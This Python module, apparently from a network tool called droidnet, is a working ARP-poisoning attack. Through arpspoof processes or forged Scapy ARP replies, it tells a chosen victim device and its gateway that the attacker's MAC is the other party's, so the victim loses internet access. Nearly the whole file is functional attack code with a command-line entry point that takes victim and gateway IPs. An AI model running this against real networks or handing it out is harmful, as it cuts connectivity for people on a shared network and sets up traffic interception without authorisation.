"""
ARP Poison Module — bidirectional ARP spoofing via arpspoof (preferred)
with fallback to Scapy when dsniff is not available.

Why arpspoof first?
    Scapy requires raw socket access at the kernel level. Android
    blocks this even with root. arpspoof uses a native implementation
    compatible with the Android kernel.

Attack flow (arpspoof mode):
    proc1: arpspoof -i <iface> -t <VICTIM>  <GATEWAY>
        → tells the VICTIM that the GATEWAY is at our MAC
    proc2: arpspoof -i <iface> -t <GATEWAY> <VICTIM>
        → tells the GATEWAY that the VICTIM is at our MAC
    Result: traffic goes nowhere → target loses internet.

On Ctrl+C both processes are terminated; arpspoof sends legitimate
ARP replies during shutdown, restoring the table on both sides.

NOTE: The dsniff package (which provides arpspoof) is NOT available
in Termux. On Linux: apt install dsniff. Otherwise, install scapy
(`pip install scapy`) and the native Python fallback will be used.
"""

import ipaddress
import shutil
import subprocess
import sys
import time

from rich import print as rprint

from droidnet.core.logger import get_logger
from droidnet.platform.utils import check_root, get_default_iface

# Scapy is optional — only used if arpspoof is missing.
try:
    from scapy.all import ARP, Ether, sendp, srp, get_if_hwaddr
    _SCAPY_OK = True
except ImportError:
    _SCAPY_OK = False


log = get_logger(__name__)


def _arpspoof_available() -> bool:
    """Return True if arpspoof is found in PATH."""
    return shutil.which("arpspoof") is not None


def _valid_ip(value: str) -> bool:
    """True if *value* is a well-formed IPv4/IPv6 address."""
    try:
        ipaddress.ip_address(value)
        return True
    except ValueError:
        return False


# ══════════════════════════════════════════════════════════════════
#  Fallback Scapy (when dsniff is missing)
# ══════════════════════════════════════════════════════════════════

def _resolve_mac(ip: str, iface: str, timeout: float = 3.0) -> str | None:
    """Returns the MAC of *ip* via ARP request, or None if it doesn't respond."""
    try:
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            iface=iface, timeout=timeout, verbose=False,
        )
    except Exception as exc:
        rprint(f"[red]ARP resolve failed for {ip}: {exc}[/red]")
        return None
    for _, rcv in ans:
        return rcv.hwsrc
    return None


def _poison_scapy(
    target_ip: str,
    gateway_ip: str,
    iface: str,
    interval: float = 2.0,
) -> None:
    """
    ARP poisoning loop using Scapy.

    Resolves real MACs of victim and gateway, sends forged replies at
    intervals of *interval* seconds, and upon exit sends a burst of
    replies with original MACs to repair both ARP tables.
    """
    rprint("[dim][·] Resolving victim and gateway MACs...[/dim]")
    target_mac  = _resolve_mac(target_ip,  iface)
    gateway_mac = _resolve_mac(gateway_ip, iface)
    if not target_mac or not gateway_mac:
        rprint("[bold red][✗] Could not resolve MACs (hosts down or incorrect iface?).[/bold red]")
        return

    try:
        our_mac = get_if_hwaddr(iface)
    except Exception as exc:
        rprint(f"[bold red][✗] Could not read MAC from {iface}: {exc}[/bold red]")
        return

    rprint(f"  Victim MAC : [cyan]{target_mac}[/cyan]")
    rprint(f"  Gateway MAC : [cyan]{gateway_mac}[/cyan]")
    rprint(f"  Our MAC    : [cyan]{our_mac}[/cyan]")
    rprint("  [dim]Ctrl+C to stop and restore.[/dim]\n")

    poison_target  = Ether(dst=target_mac)  / ARP(op=2, psrc=gateway_ip,
                                                  hwsrc=our_mac,
                                                  pdst=target_ip,
                                                  hwdst=target_mac)
    poison_gateway = Ether(dst=gateway_mac) / ARP(op=2, psrc=target_ip,
                                                  hwsrc=our_mac,
                                                  pdst=gateway_ip,
                                                  hwdst=gateway_mac)
    restore_target  = Ether(dst=target_mac)  / ARP(op=2, psrc=gateway_ip,
                                                   hwsrc=gateway_mac,
                                                   pdst=target_ip,
                                                   hwdst=target_mac)
    restore_gateway = Ether(dst=gateway_mac) / ARP(op=2, psrc=target_ip,
                                                   hwsrc=target_mac,
                                                   pdst=gateway_ip,
                                                   hwdst=gateway_mac)

    sent = 0
    try:
        while True:
            sendp(poison_target,  iface=iface, verbose=False)
            sendp(poison_gateway, iface=iface, verbose=False)
            sent += 2
            rprint(f"  [dim][→] Poisoned packets: {sent}[/dim]", end="\r")
            time.sleep(interval)
    except KeyboardInterrupt:
        rprint("\n[bold yellow][!][/bold yellow] Restoring ARP (5 bursts)...")
    finally:
        for _ in range(5):
            sendp(restore_target,  iface=iface, verbose=False)
            sendp(restore_gateway, iface=iface, verbose=False)
            time.sleep(0.2)
        rprint("[bold green][✓][/bold green] Clean. Victim regained internet.")


def poison(target_ip: str, gateway_ip: str, iface: str = "wlan0") -> None:
    """
    Run a bidirectional ARP poisoning attack against *target_ip*.

    Blocks until Ctrl+C, then restores the ARP table on both ends.

    Backend:
        1. arpspoof (preferred, requires dsniff).
        2. Scapy fallback if dsniff is missing but scapy is present.

    Args:
        target_ip  : IP of the device to cut off.
        gateway_ip : IP of the network gateway/router.
        iface      : Network interface to use (default: wlan0).
    """
    if not _valid_ip(target_ip):
        rprint(f"[red][✗] Invalid victim IP: {target_ip}[/red]")
        return
    if not _valid_ip(gateway_ip):
        rprint(f"[red][✗] Invalid gateway IP: {gateway_ip}[/red]")
        return

    log.info("arp poison start victim=%s gateway=%s iface=%s", target_ip, gateway_ip, iface)
    if not _arpspoof_available():
        if _SCAPY_OK:
            rprint("[yellow][!][/yellow] arpspoof not found; using Scapy fallback.")
            rprint("[bold red][☠][/bold red] Poisoning ARP (Scapy)...")
            rprint(f"  Victim : [cyan]{target_ip}[/cyan]")
            rprint(f"  Gateway : [cyan]{gateway_ip}[/cyan]")
            rprint(f"  Iface   : [cyan]{iface}[/cyan]")
            _poison_scapy(target_ip, gateway_ip, iface)
            return
        rprint("[bold red][✗] arpspoof not found and scapy not installed.[/bold red]")
        rprint("[dim]On Linux: sudo apt install dsniff  (or pip install scapy)[/dim]")
        rprint("[dim]On Termux: pip install scapy (Android usually blocks raw sockets)[/dim]")
        return

    rprint("[bold red][☠][/bold red] Poisoning ARP...")
    rprint(f"  Victim : [cyan]{target_ip}[/cyan]")
    rprint(f"  Gateway : [cyan]{gateway_ip}[/cyan]")
    rprint(f"  Iface   : [cyan]{iface}[/cyan]")
    rprint("  [dim]Ctrl+C to stop and restore.[/dim]\n")

    proc1 = subprocess.Popen(
        ["arpspoof", "-i", iface, "-t", target_ip, gateway_ip],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    proc2 = subprocess.Popen(
        ["arpspoof", "-i", iface, "-t", gateway_ip, target_ip],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    rprint(f"[bold green][✓][/bold green] Attack active (PIDs: {proc1.pid}, {proc2.pid})")

    try:
        # Blocks until either arpspoof dies (or Ctrl+C).
        # If one falls, the attack is incomplete and we must stop the other.
        while proc1.poll() is None and proc2.poll() is None:
            time.sleep(0.5)
        if proc1.poll() is not None or proc2.poll() is not None:
            rprint("[bold yellow][!][/bold yellow] An arpspoof process terminated. Cleaning up...")
    except KeyboardInterrupt:
        rprint("\n[bold yellow][!][/bold yellow] Stopping and restoring network...")
    finally:
        for p in (proc1, proc2):
            if p.poll() is None:
                p.terminate()
                try:
                    p.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    p.kill()
                    p.wait()
        rprint("[bold green][✓][/bold green] Clean. Victim regained internet.")


if __name__ == "__main__":
    if not check_root():
        rprint("[red][✗] Root required.[/red]")
        sys.exit(1)

    if len(sys.argv) < 3:
        rprint("[yellow]Usage: python -m droidnet.modules.spoofer <VICTIM_IP> <GATEWAY_IP> [IFACE][/yellow]")
        sys.exit(1)

    _target  = sys.argv[1]
    _gateway = sys.argv[2]
    _iface   = sys.argv[3] if len(sys.argv) > 3 else get_default_iface()
    poison(_target, _gateway, _iface)
